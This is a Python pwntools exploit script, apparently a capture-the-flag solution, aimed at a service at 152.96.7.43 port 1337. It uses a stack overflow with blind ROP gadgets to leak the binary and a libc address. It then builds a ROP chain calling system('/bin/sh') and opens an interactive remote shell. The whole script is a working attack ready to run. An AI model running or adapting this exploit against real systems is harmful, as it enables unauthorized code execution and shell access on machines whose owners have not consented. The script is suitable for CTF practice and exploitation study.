#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 152.96.7.43 --port 1337
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '152.96.7.43'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

libc = ELF("libc-2.31.so")

# newline terminated
# crashes on 0x49 bytes

stop = 0x401028
main = 0x401175
brop = 0x40124a
leak = 0x401028

# dump binary

"""
current_addr = 0x400000

f = open('vuln', 'wb')
while True:
    print("*** READING {} ***".format(hex(current_addr)))
    if b'\n' in pack(current_addr):
        current_addr += 1
        f.write(b'\0')
        continue
    io = start()
    payload = flat({
        0x48: [
            brop+9,
            current_addr,
            leak,
            ],
        })
    io.sendlineafter(b"Can you see me?\n", payload)

    try:
        res = io.recv(timeout=4)
        current_addr += len(res)
        res = res[:-1] + b'\x00'
        print(res)
        f.write(res)
        f.flush()
        io.close()
    except:
        io.close()
        break
f.close()
"""

io = start()
io.sendlineafter(
    b"Can you see me?\n",
    flat({0x48: [brop+9, 0x404018, leak, main]}),
)

dump = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc.address = dump - libc.sym['puts']
io.info("LIBC : " + hex(libc.address))
print(hex(dump))

# puts at 0x84420

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())

io.sendlineafter(
    b"Can you see me?\n",
    flat({0x48: rop.chain()}),
)

io.interactive()
# io.sendline(flat({0x48: [brop+9, 0x400000, dump]}))
# io.interactive()

